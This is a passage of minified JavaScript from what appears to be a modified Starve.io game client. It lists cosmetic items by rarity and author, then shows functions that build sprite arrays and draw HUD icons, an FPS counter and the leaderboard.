          night: IMAGES.CRATE67N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Boar"
        }, {
          id: 67,
          day: IMAGES.CRATE68D,
          night: IMAGES.CRATE68N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Fire mob"
        }, {
          id: 68,
          day: IMAGES.CRATE69D,
          night: IMAGES.CRATE69N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the Crab"
        }, {
          id: 69,
          day: IMAGES.CRATE70D,
          night: IMAGES.CRATE70N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Box of the King Crab"
        }, {
          id: 70,
          day: IMAGES.CRATE71D,
          night: IMAGES.CRATE71N,
          rarity: RARITY.GOLD,
          author: "CrysTal",
          name: "Crystal Sky Box"
        }, {
          id: 71,
          day: IMAGES.CRATE72D,
          night: IMAGES.CRATE72N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Dragon Box"
        }],
        BOOK: [{
          id: 0,
          day: IMAGES.BOOK0D,
          night: IMAGES.BOOK0N,
          rarity: RARITY.FREE,
          author: "Starve.io",
          name: "Book 1"
        }, {
          id: 1,
          day: IMAGES.BOOK3D,
          night: IMAGES.BOOK3N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Book 2"
        }, {
          id: 2,
          day: IMAGES.BOOK4D,
          night: IMAGES.BOOK4N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Book 3"
        }, {
          id: 3,
          day: IMAGES.BOOK5D,
          night: IMAGES.BOOK5N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Book 4"
        }, {
          id: 4,
          day: IMAGES.BOOK6D,
          night: IMAGES.BOOK6N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Damaged Book 1"
        }, {
          id: 18,
          day: IMAGES.BOOK18D,
          night: IMAGES.BOOK18N,
          rarity: RARITY.WOOD,
          author: "SeveR",
          name: "Damaged Book 2"
        }, {
          id: 5,
          day: IMAGES.BOOK1D,
          night: IMAGES.BOOK1N,
          rarity: RARITY.STONE,
          author: "Doctorpus",
          name: "Scroll"
        }, {
          id: 6,
          day: IMAGES.BOOK2D,
          night: IMAGES.BOOK2N,
          rarity: RARITY.STONE,
          author: "Doctorpus",
          name: "Clipboard"
        }, {
          id: 7,
          day: IMAGES.BOOK7D,
          night: IMAGES.BOOK7N,
          rarity: RARITY.STONE,
          author: "eogito",
          name: "Seed Book"
        }, {
          id: 20,
          day: IMAGES.BOOK20D,
          night: IMAGES.BOOK20N,
          rarity: RARITY.STONE,
          author: "Taco4Life",
          name: "Camo Book"
        }, {
          id: 24,
          day: IMAGES.BOOK24D,
          night: IMAGES.BOOK24N,
          rarity: RARITY.STONE,
          author: "Communist",
          name: "Stone Tablet"
        }, {
          id: 10,
          day: IMAGES.BOOK13D,
          night: IMAGES.BOOK13N,
          rarity: RARITY.GOLD,
          author: "pizza wa",
          name: "Star Book"
        }, {
          id: 8,
          day: IMAGES.BOOK9D,
          night: IMAGES.BOOK9N,
          rarity: RARITY.GOLD,
          author: "eogito",
          name: "Gold Book"
        }, {
          id: 15,
          day: IMAGES.BOOK15D,
          night: IMAGES.BOOK15N,
          rarity: RARITY.GOLD,
          author: "Starve.io",
          name: "Old Mysterious Paper"
        }, {
          id: 17,
          day: IMAGES.BOOK17D,
          night: IMAGES.BOOK17N,
          rarity: RARITY.GOLD,
          author: "Starve.io",
          name: "Gold Engraving"
        }, {
          id: 25,
          day: IMAGES.BOOK25D,
          night: IMAGES.BOOK25N,
          rarity: RARITY.GOLD,
          author: "fatant",
          name: "Ant Book"
        }, {
          id: 32,
          day: IMAGES.BOOK32D,
          night: IMAGES.BOOK32N,
          rarity: RARITY.GOLD,
          author: "eogito",
          name: "Mummy Book"
        }, {
          id: 37,
          day: IMAGES.BOOK39D,
          night: IMAGES.BOOK39N,
          rarity: RARITY.GOLD,
          author: "Taco4Life",
          name: "Garlic Book"
        }, {
          id: 38,
          day: IMAGES.BOOK38D,
          night: IMAGES.BOOK38N,
          rarity: RARITY.GOLD,
          author: "Taco4Life",
          name: "Pumpkin Book"
        }, {
          id: 39,
          day: IMAGES.BOOK40D,
          night: IMAGES.BOOK40N,
          rarity: RARITY.GOLD,
          author: "Starve.io",
          name: "Christmas Tree Book"
        }, {
          id: 11,
          day: IMAGES.BOOK10D,
          night: IMAGES.BOOK10N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Diamond Book"
        }, {
          id: 9,
          day: IMAGES.BOOK8D,
          night: IMAGES.BOOK8N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Obscure Book"
        }, {
          id: 16,
          day: IMAGES.BOOK16D,
          night: IMAGES.BOOK16N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Rolled Parchment"
        }, {
          id: 22,
          day: IMAGES.BOOK22D,
          night: IMAGES.BOOK22N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Cake Book"
        }, {
          id: 23,
          day: IMAGES.BOOK23D,
          night: IMAGES.BOOK23N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Christmas Cake Book"
        }, {
          id: 30,
          day: IMAGES.BOOK30D,
          night: IMAGES.BOOK30N,
          rarity: RARITY.DIAMOND,
          author: "MADBalgouthi",
          name: "Fish Book"
        }, {
          id: 31,
          day: IMAGES.BOOK31D,
          night: IMAGES.BOOK31N,
          rarity: RARITY.DIAMOND,
          author: "CrysTal",
          name: "Once upon a time"
        }, {
          id: 13,
          day: IMAGES.BOOK11D,
          night: IMAGES.BOOK11N,
          rarity: RARITY.AMETHYST,
          author: "eogito",
          name: "Amethyst Book"
        }, {
          id: 28,
          day: IMAGES.BOOK28D,
          night: IMAGES.BOOK28N,
          rarity: RARITY.AMETHYST,
          author: "eogito",
          name: "Paint Pallet"
        }, {
          id: 29,
          day: IMAGES.BOOK29D,
          night: IMAGES.BOOK29N,
          rarity: RARITY.AMETHYST,
          author: "CrysTal",
          name: "Watermelon Book"
        }, {
          id: 27,
          day: IMAGES.BOOK27D,
          night: IMAGES.BOOK27N,
          rarity: RARITY.AMETHYST,
          author: "Taco4Life",
          name: "Thornbush Book"
        }, {
          id: 35,
          day: IMAGES.BOOK35D,
          night: IMAGES.BOOK35N,
          rarity: RARITY.AMETHYST,
          author: "Taco4Life",
          name: "Menu"
        }, {
          id: 36,
          day: IMAGES.BOOK36D,
          night: IMAGES.BOOK36N,
          rarity: RARITY.AMETHYST,
          author: "CrysTal",
          name: "Lover Letter"
        }, {
          id: 40,
          day: IMAGES.BOOK41D,
          night: IMAGES.BOOK41N,
          rarity: RARITY.AMETHYST,
          author: "Starve.io",
          name: "Fresh-Baked Cookies"
        }, {
          id: 41,
          day: IMAGES.BOOK42D,
          night: IMAGES.BOOK42N,
          rarity: RARITY.AMETHYST,
          author: "Starve.io",
          name: "Inside, there is just a book."
        }, {
          id: 33,
          day: IMAGES.BOOK33D,
          night: IMAGES.BOOK33N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Winter Book"
        }, {
          id: 34,
          day: IMAGES.BOOK34D,
          night: IMAGES.BOOK34N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Autumn Book"
        }, {
          id: 14,
          day: IMAGES.BOOK12D,
          night: IMAGES.BOOK12N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Reidite Book"
        }, {
          id: 12,
          day: IMAGES.BOOK14D,
          night: IMAGES.BOOK14N,
          rarity: RARITY.REIDITE,
          author: "Winter",
          name: "Lava Book"
        }, {
          id: 26,
          day: IMAGES.BOOK26D,
          night: IMAGES.BOOK26N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Lava Book 2"
        }, {
          id: 19,
          day: IMAGES.BOOK19D,
          night: IMAGES.BOOK19N,
          rarity: RARITY.REIDITE,
          author: "Winter",
          name: "Ocean Mystery"
        }, {
          id: 21,
          day: IMAGES.BOOK21D,
          night: IMAGES.BOOK21N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Dragon Book"
        }, {
          id: 42,
          day: IMAGES.BOOK43D,
          night: IMAGES.BOOK43N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Engineer Book"
        }, {
          id: 43,
          day: IMAGES.BOOK44D,
          night: IMAGES.BOOK44N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Nightmare Book"
        }, {
          id: 44,
          day: IMAGES.BOOK45D,
          night: IMAGES.BOOK45N,
          rarity: RARITY.REIDITE,
          author: "aloner",
          name: "Mystery Book"
        }],
        ACCESSORY: [{
          id: 0,
          day: IMAGES.ACCESSORY0D,
          night: IMAGES.ACCESSORY0D,
          rarity: RARITY.FREE,
          author: "Starve.io",
          name: "Nothing"
        }, {
          id: 2,
          day: IMAGES.ACCESSORY4D,
          night: IMAGES.ACCESSORY4N,
          rarity: RARITY.FREE,
          author: "Starve.io",
          name: "Pink Cheeks"
        }, {
          id: 3,
          day: IMAGES.ACCESSORY5D,
          night: IMAGES.ACCESSORY5N,
          rarity: RARITY.FREE,
          author: "Starve.io",
          name: "Heart"
        }, {
          id: 1,
          day: IMAGES.ACCESSORY3D,
          night: IMAGES.ACCESSORY3N,
          rarity: RARITY.FREE,
          author: "Starve.io",
          name: "Bandage 1"
        }, {
          id: 4,
          day: IMAGES.ACCESSORY6D,
          night: IMAGES.ACCESSORY6N,
          rarity: RARITY.FREE,
          author: "Starve.io",
          name: "Flower 1"
        }, {
          id: 5,
          day: IMAGES.ACCESSORY8D,
          night: IMAGES.ACCESSORY8N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Bow 1"
        }, {
          id: 6,
          day: IMAGES.ACCESSORY9D,
          night: IMAGES.ACCESSORY9N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Bandage 2"
        }, {
          id: 7,
          day: IMAGES.ACCESSORY15D,
          night: IMAGES.ACCESSORY15N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Flower 2"
        }, {
          id: 8,
          day: IMAGES.ACCESSORY10D,
          night: IMAGES.ACCESSORY10N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Bandage 3"
        }, {
          id: 36,
          day: IMAGES.ACCESSORY36D,
          night: IMAGES.ACCESSORY36N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Foliage"
        }, {
          id: 59,
          day: IMAGES.ACCESSORY47D,
          night: IMAGES.ACCESSORY47N,
          rarity: RARITY.WOOD,
          author: "eogito",
          name: "Peaceful"
        }, {
          id: 67,
          day: IMAGES.ACCESSORY55D,
          night: IMAGES.ACCESSORY55N,
          rarity: RARITY.WOOD,
          author: "pizza wa",
          name: "Sparkles"
        }, {
          id: 68,
          day: IMAGES.ACCESSORY56D,
          night: IMAGES.ACCESSORY56N,
          rarity: RARITY.WOOD,
          author: "pizza wa",
          name: "Luxury"
        }, {
          id: 69,
          day: IMAGES.ACCESSORY57D,
          night: IMAGES.ACCESSORY57N,
          rarity: RARITY.WOOD,
          author: "pizza wa",
          name: "Snow Flakes Crown"
        }, {
          id: 17,
          day: IMAGES.ACCESSORY17D,
          night: IMAGES.ACCESSORY17N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Glasses 1"
        }, {
          id: 10,
          day: IMAGES.ACCESSORY7D,
          night: IMAGES.ACCESSORY7N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Bow 2"
        }, {
          id: 11,
          day: IMAGES.ACCESSORY13D,
          night: IMAGES.ACCESSORY13N,
          rarity: RARITY.STONE,
          author: "pizza wa",
          name: "Little Stars"
        }, {
          id: 12,
          day: IMAGES.ACCESSORY11D,
          night: IMAGES.ACCESSORY11N,
          rarity: RARITY.STONE,
          author: "eogito",
          name: "Pirate Eye Patch 1"
        }, {
          id: 44,
          day: IMAGES.ACCESSORY44D,
          night: IMAGES.ACCESSORY44N,
          rarity: RARITY.STONE,
          author: "Taco4Life",
          name: "Pirate Eye Patch 2"
        }, {
          id: 23,
          day: IMAGES.ACCESSORY23D,
          night: IMAGES.ACCESSORY23N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Clown nose"
        }, {
          id: 16,
          day: IMAGES.ACCESSORY2D,
          night: IMAGES.ACCESSORY2N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Eye Patch"
        }, {
          id: 30,
          day: IMAGES.ACCESSORY30D,
          night: IMAGES.ACCESSORY30N,
          rarity: RARITY.STONE,
          author: "eogito",
          name: "Flower 3"
        }, {
          id: 38,
          day: IMAGES.ACCESSORY38D,
          night: IMAGES.ACCESSORY38N,
          rarity: RARITY.STONE,
          author: "Winter",
          name: "False Nose"
        }, {
          id: 74,
          day: IMAGES.ACCESSORY62D,
          night: IMAGES.ACCESSORY62N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Red Cloth"
        }, {
          id: 75,
          day: IMAGES.ACCESSORY63D,
          night: IMAGES.ACCESSORY63N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Blue Cloth"
        }, {
          id: 79,
          day: IMAGES.ACCESSORY67D,
          night: IMAGES.ACCESSORY67N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Transparent Mask"
        }, {
          id: 89,
          day: IMAGES.ACCESSORY77D,
          night: IMAGES.ACCESSORY77N,
          rarity: RARITY.STONE,
          author: "Anyone want to play?",
          name: "Starve.io Anime"
        }, {
          id: 94,
          day: IMAGES.ACCESSORY78D,
          night: IMAGES.ACCESSORY78N,
          rarity: RARITY.STONE,
          author: "Ant",
          name: "Hero Mask"
        }, {
          id: 15,
          day: IMAGES.ACCESSORY16D,
          night: IMAGES.ACCESSORY16N,
          rarity: RARITY.GOLD,
          author: "Starve.io",
          name: "Star Glasses"
        }, {
          id: 21,
          day: IMAGES.ACCESSORY21D,
          night: IMAGES.ACCESSORY21N,
          rarity: RARITY.GOLD,
          author: "Starve.io",
          name: "Great-aunt's Glasses"
        }, {
          id: 24,
          day: IMAGES.ACCESSORY24D,
          night: IMAGES.ACCESSORY24N,
          rarity: RARITY.GOLD,
          author: "Starve.io",
          name: "Little Starver"
        }, {
          id: 22,
          day: IMAGES.ACCESSORY22D,
          night: IMAGES.ACCESSORY22N,
          rarity: RARITY.GOLD,
          author: "Starve.io",
          name: "Little Glasses"
        }, {
          id: 13,
          day: IMAGES.ACCESSORY14D,
          night: IMAGES.ACCESSORY14N,
          rarity: RARITY.GOLD,
          author: "Starve.io",
          name: "Flower Chain"
        }, {
          id: 29,
          day: IMAGES.ACCESSORY29D,
          night: IMAGES.ACCESSORY29N,
          rarity: RARITY.GOLD,
          author: "eogito",
          name: "Horns"
        }, {
          id: 31,
          day: IMAGES.ACCESSORY31D,
          night: IMAGES.ACCESSORY31N,
          rarity: RARITY.GOLD,
          author: "eogito",
          name: "Golden Flower"
        }, {
          id: 40,
          day: IMAGES.ACCESSORY40D,
          night: IMAGES.ACCESSORY40N,
          rarity: RARITY.GOLD,
          author: "pizza wa",
          name: "Sleeping Mask"
        }, {
          id: 57,
          day: IMAGES.ACCESSORY50D,
          night: IMAGES.ACCESSORY50N,
          rarity: RARITY.GOLD,
          author: "Taco4Life",
          name: "Fish on your head"
        }, {
          id: 58,
          day: IMAGES.ACCESSORY46D,
          night: IMAGES.ACCESSORY46N,
          rarity: RARITY.GOLD,
          author: "eogito",
          name: "Rose"
        }, {
          id: 91,
          day: IMAGES.ACCESSORY80D,
          night: IMAGES.ACCESSORY80N,
          rarity: RARITY.GOLD,
          author: "upfiz",
          name: "Grey Scarf"
        }, {
          id: 92,
          day: IMAGES.ACCESSORY81D,
          night: IMAGES.ACCESSORY81N,
          rarity: RARITY.GOLD,
          author: "upfiz",
          name: "Black Scarf"
        }, {
          id: 93,
          day: IMAGES.ACCESSORY82D,
          night: IMAGES.ACCESSORY82N,
          rarity: RARITY.GOLD,
          author: "upfiz",
          name: "Skull Mask"
        }, {
          id: 9,
          day: IMAGES.ACCESSORY1D,
          night: IMAGES.ACCESSORY1N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Fancy Glasses"
        }, {
          id: 25,
          day: IMAGES.ACCESSORY25D,
          night: IMAGES.ACCESSORY25N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Medecin Mask"
        }, {
          id: 14,
          day: IMAGES.ACCESSORY12D,
          night: IMAGES.ACCESSORY12N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Mr. Mayor"
        }, {
          id: 19,
          day: IMAGES.ACCESSORY19D,
          night: IMAGES.ACCESSORY19N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Sunglasses 2"
        }, {
          id: 28,
          day: IMAGES.ACCESSORY28D,
          night: IMAGES.ACCESSORY28N,
          rarity: RARITY.DIAMOND,
          author: "pizza wa",
          name: "Starfish"
        }, {
          id: 37,
          day: IMAGES.ACCESSORY37D,
          night: IMAGES.ACCESSORY37N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Berry"
        }, {
          id: 39,
          day: IMAGES.ACCESSORY39D,
          night: IMAGES.ACCESSORY39N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Flake"
        }, {
          id: 43,
          day: IMAGES.ACCESSORY43D,
          night: IMAGES.ACCESSORY43N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Leaf "
        }, {
          id: 61,
          day: IMAGES.ACCESSORY49D,
          night: IMAGES.ACCESSORY49N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "A sword in your head"
        }, {
          id: 62,
          day: IMAGES.ACCESSORY51D,
          night: IMAGES.ACCESSORY51N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Winter Scarf"
        }, {
          id: 64,
          day: IMAGES.ACCESSORY53D,
          night: IMAGES.ACCESSORY53N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Winter Scarf 2"
        }, {
          id: 66,
          day: IMAGES.ACCESSORY54D,
          night: IMAGES.ACCESSORY54N,
          rarity: RARITY.DIAMOND,
          author: "eogito",
          name: "Winter Scarf 3"
        }, {
          id: 70,
          day: IMAGES.ACCESSORY58D,
          night: IMAGES.ACCESSORY58N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Mask with animal tracks"
        }, {
          id: 71,
          day: IMAGES.ACCESSORY59D,
          night: IMAGES.ACCESSORY59N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Spring Mask"
        }, {
          id: 72,
          day: IMAGES.ACCESSORY60D,
          night: IMAGES.ACCESSORY60N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Pink Mask"
        }, {
          id: 73,
          day: IMAGES.ACCESSORY61D,
          night: IMAGES.ACCESSORY61N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Blue Mask"
        }, {
          id: 76,
          day: IMAGES.ACCESSORY64D,
          night: IMAGES.ACCESSORY64N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Military Mask"
        }, {
          id: 77,
          day: IMAGES.ACCESSORY65D,
          night: IMAGES.ACCESSORY65N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Orange Mask"
        }, {
          id: 78,
          day: IMAGES.ACCESSORY66D,
          night: IMAGES.ACCESSORY66N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "White and Red Points Mask"
        }, {
          id: 80,
          day: IMAGES.ACCESSORY68D,
          night: IMAGES.ACCESSORY68N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Stick out your tongue Mask"
        }, {
          id: 81,
          day: IMAGES.ACCESSORY69D,
          night: IMAGES.ACCESSORY69N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Two Teeth Mask"
        }, {
          id: 82,
          day: IMAGES.ACCESSORY70D,
          night: IMAGES.ACCESSORY70N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Make-up Mask"
        }, {
          id: 83,
          day: IMAGES.ACCESSORY71D,
          night: IMAGES.ACCESSORY71N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Sad Mask"
        }, {
          id: 84,
          day: IMAGES.ACCESSORY72D,
          night: IMAGES.ACCESSORY72N,
          rarity: RARITY.DIAMOND,
          author: "Starve.io",
          name: "Happy Mask"
        }, {
          id: 90,
          day: IMAGES.ACCESSORY79D,
          night: IMAGES.ACCESSORY79N,
          rarity: RARITY.DIAMOND,
          author: "aloner",
          name: "Blood"
        }, {
          id: 27,
          day: IMAGES.ACCESSORY27D,
          night: IMAGES.ACCESSORY27N,
          rarity: RARITY.AMETHYST,
          author: "Starve.io",
          name: "Clown Face"
        }, {
          id: 20,
          day: IMAGES.ACCESSORY20D,
          night: IMAGES.ACCESSORY20N,
          rarity: RARITY.AMETHYST,
          author: "Starve.io",
          name: "Sunglasses 3"
        }, {
          id: 32,
          day: IMAGES.ACCESSORY32D,
          night: IMAGES.ACCESSORY32N,
          rarity: RARITY.AMETHYST,
          author: "eogito",
          name: "Engineer's Glasses"
        }, {
          id: 33,
          day: IMAGES.ACCESSORY33D,
          night: IMAGES.ACCESSORY33N,
          rarity: RARITY.AMETHYST,
          author: "eogito",
          name: "Engineer's Monocle"
        }, {
          id: 34,
          day: IMAGES.ACCESSORY34D,
          night: IMAGES.ACCESSORY34N,
          rarity: RARITY.AMETHYST,
          author: "Starve.io",
          name: "Mauve's butt"
        }, {
          id: 41,
          day: IMAGES.ACCESSORY41D,
          night: IMAGES.ACCESSORY41N,
          rarity: RARITY.AMETHYST,
          author: "eogito",
          name: "Lapa Head"
        }, {
          id: 42,
          day: IMAGES.ACCESSORY42D,
          night: IMAGES.ACCESSORY42N,
          rarity: RARITY.AMETHYST,
          author: "eogito",
          name: "Lapa Head "
        }, {
          id: 85,
          day: IMAGES.ACCESSORY73D,
          night: IMAGES.ACCESSORY73N,
          rarity: RARITY.AMETHYST,
          author: "Starve.io",
          name: "Mask and Glasses"
        }, {
          id: 60,
          day: IMAGES.ACCESSORY48D,
          night: IMAGES.ACCESSORY48N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Jason"
        }, {
          id: 26,
          day: IMAGES.ACCESSORY26D,
          night: IMAGES.ACCESSORY26N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Devil Horns"
        }, {
          id: 18,
          day: IMAGES.ACCESSORY18D,
          night: IMAGES.ACCESSORY18N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Big Boss"
        }, {
          id: 35,
          day: IMAGES.ACCESSORY35D,
          night: IMAGES.ACCESSORY35N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Baby Kraken"
        }, {
          id: 63,
          day: IMAGES.ACCESSORY52D,
          night: IMAGES.ACCESSORY52N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Deer Antlers"
        }, {
          id: 65,
          day: IMAGES.ACCESSORY45D,
          night: IMAGES.ACCESSORY45N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Baby Dragon on your head"
        }, {
          id: 86,
          day: IMAGES.ACCESSORY74D,
          night: IMAGES.ACCESSORY74N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Gaz Mask and Glasses"
        }, {
          id: 87,
          day: IMAGES.ACCESSORY75D,
          night: IMAGES.ACCESSORY75N,
          rarity: RARITY.REIDITE,
          author: "Starve.io",
          name: "Pink Gaz Mask and Glasses"
        }, {
          id: 88,
          day: IMAGES.ACCESSORY76D,
          night: IMAGES.ACCESSORY76N,
          rarity: RARITY.REIDITE,
          author: "eogito",
          name: "Engineer Glasses"
        }, {
          id: 45,
          day: IMAGES.LEVEL5D,
          night: IMAGES.LEVEL5N,
          rarity: RARITY.LEVEL,
          author: "Starve.io",
          name: "More than Level 5",
          level: 5
        }, {
          id: 46,
          day: IMAGES.LEVEL10D,
          night: IMAGES.LEVEL10N,
          rarity: RARITY.LEVEL,
          author: "Starve.io",
          name: "More than Level 10",
          level: 10
        }, {
          id: 47,
          day: IMAGES.LEVEL15D,
          night: IMAGES.LEVEL15N,
          rarity: RARITY.LEVEL,
          author: "Starve.io",
          name: "More than Level 15",
          level: 15
        }, {
          id: 48,
          day: IMAGES.LEVEL20D,
          night: IMAGES.LEVEL20N,
          rarity: RARITY.LEVEL,
          author: "Starve.io",
          name: "More than Level 20",
          level: 20
        }, {
          id: 49,
          day: IMAGES.LEVEL25D,
          night: IMAGES.LEVEL25N,
          rarity: RARITY.LEVEL,
          author: "Starve.io",
          name: "More than Level 25",
          level: 25
        }, {
          id: 50,
          day: IMAGES.LEVEL30D,
          night: IMAGES.LEVEL30N,
          rarity: RARITY.LEVEL,
          author: "Starve.io",
          name: "More than Level 30",
          level: 30
        }, {
          id: 51,
          day: IMAGES.LEVEL35D,
          night: IMAGES.LEVEL35N,
          rarity: RARITY.LEVEL,
          author: "Starve.io",
          name: "More than Level 35",
          level: 35
        }, {
          id: 52,
          day: IMAGES.LEVEL40D,
          night: IMAGES.LEVEL40N,
          rarity: RARITY.LEVEL,
          author: "Starve.io",
          name: "More than Level 40",
          level: 40
        }, {
          id: 53,
          day: IMAGES.LEVEL45D,
          night: IMAGES.LEVEL45N,
          rarity: RARITY.LEVEL,
          author: "Starve.io",
          name: "More than Level 45",
          level: 45
        }, {
          id: 54,
          day: IMAGES.LEVEL50D,
          night: IMAGES.LEVEL50N,
          rarity: RARITY.LEVEL,
          author: "Starve.io",
          name: "More than Level 50",
          level: 50
        }, {
          id: 55,
          day: IMAGES.LEVEL55D,
          night: IMAGES.LEVEL55N,
          rarity: RARITY.LEVEL,
          author: "Starve.io",
          name: "More than Level 55",
          level: 55
        }, {
          id: 56,
          day: IMAGES.LEVEL60D,
          night: IMAGES.LEVEL60N,
          rarity: RARITY.LEVEL,
          author: "Starve.io",
          name: "More than Level 60",
          level: 60
        }]
      };
      ds.ZOMBIE_SKIN = find_cosmetics_per_id(COSMETICS.SKIN, 21);
      ds.VAMPIRE_SKIN = find_cosmetics_per_id(COSMETICS.SKIN, 20);
      sprite[Ie.BODY] = [];
      sprite[Ie.HAND] = [];
      sprite[Ie.CRATE] = [];
      sprite[Ie.BOOK] = [];
      sprite[Ie.BAG] = [];
      sprite[Ie.ACCESSORY] = [];
      for (var e = 0; e < COSMETICS.SKIN.length; e++) {
        sprite[Ie.BODY][e] = [COSMETICS.SKIN[e].day, COSMETICS.SKIN[e].night];
        sprite[Ie.HAND][e] = [COSMETICS.SKIN[e].dayHand, COSMETICS.SKIN[e].nightHand];
      }
      for (e = 0; e < COSMETICS.BOOK.length; e++) {
        sprite[Ie.BOOK][e] = [COSMETICS.BOOK[e].day, COSMETICS.BOOK[e].night];
      }
      for (e = 0; e < COSMETICS.CRATE.length; e++) {
        sprite[Ie.CRATE][e] = [COSMETICS.CRATE[e].day, COSMETICS.CRATE[e].night];
      }
      for (e = 0; e < COSMETICS.BAG.length; e++) {
        sprite[Ie.BAG][e] = [COSMETICS.BAG[e].day, COSMETICS.BAG[e].night];
      }
      for (e = 0; e < COSMETICS.ACCESSORY.length; e++) {
        sprite[Ie.ACCESSORY][e] = [COSMETICS.ACCESSORY[e].day, COSMETICS.ACCESSORY[e].night];
      }
    };
    INFO_BOX = [];
    PLAYER_LEVEL = [];
    var zn = [];
    function Wn() {
      var e = -8;
      let i = new Image();
      let n = new Image();
      i.src = "https://cdn.discordapp.com/attachments/753665924522967240/1069177074780213278/1.png";
      n.src = "https://cdn.discordapp.com/attachments/753665924522967240/1069176731858108426/-2.png";
      if (r.visuals.gauges.weather) {
        if (__.winter.tempest == 1) {
          Nn(D, n, __.auto_feed.translate.x, __.auto_feed.translate.y + e);
          e += 70;
        }
        if (__.desert.tempest == 1) {
          Nn(D, i, __.auto_feed.translate.x, __.auto_feed.translate.y + e);
          e += 70;
        }
      }
      if (__.auto_feed.enabled) {
        var a = sprite[Ie.AUTO_FEED];
        Nn(D, a, __.auto_feed.translate.x, __.auto_feed.translate.y + e);
        e += 70;
      }
      if (__.blizzard === 1) {
        a = sprite[Ie.STOP_REGENERATION_BLIZZARD];
        Nn(D, a, __.auto_feed.translate.x, __.auto_feed.translate.y + e);
        e += 72;
      } else if (__.gauges.cold.x < 0.25 || __.gauges.hunger.x < 0.25 || __.gauges.thirst.x < 0.25 || __.gauges.oxygen.x < 0.25 || __.gauges.warm.x < 0.25) {
        a = sprite[Ie.STOP_REGENERATION];
        Nn(D, a, __.auto_feed.translate.x, __.auto_feed.translate.y + e);
        e += 72;
      }
      if (__.bandage > 0) {
        a = sprite[Ie.BANDAGE_ACTIVATED];
        Nn(D, a, __.auto_feed.translate.x, __.auto_feed.translate.y + e);
        var o = zn[__.bandage];
        if (o === undefined) {
          o = Zi(L, __.bandage + "", 30, "#FDFDFD", null, null, null, null, null, "#C8BBBF", 6);
          zn[__.bandage] = o;
        }
        if (__.bandage < 9) {
          Nn(D, o, __.auto_feed.translate.x - 39, __.auto_feed.translate.y + e + 20);
        } else {
          Nn(D, o, __.auto_feed.translate.x - 46, __.auto_feed.translate.y + e + 20);
        }
      }
      if (r.visuals.gauges.fps.enable) {
        t.createText(r.visuals.gauges.fps.count + "FPS", "white", __.auto_feed.translate.x + 25, __.auto_feed.translate.y + e + 25, 25);
        e += 25;
      }
    }
    function Vn() {
      var e = __.ldb;
      var i = T_.leaderboard;
      if (e.update) {
        e.update = false;
        var t = e.ids;
        var r = i.can.width;
        var n = i.can.height;
        var a = i.ctx;
        var o = s_.players;
        var s = false;
        a.clearRect(0, 0, r, n);
        a.drawImage(i.img, 0, 0);
        for (var _ = 0; _ < t.length; _++) {
          var E = o[t[_]];
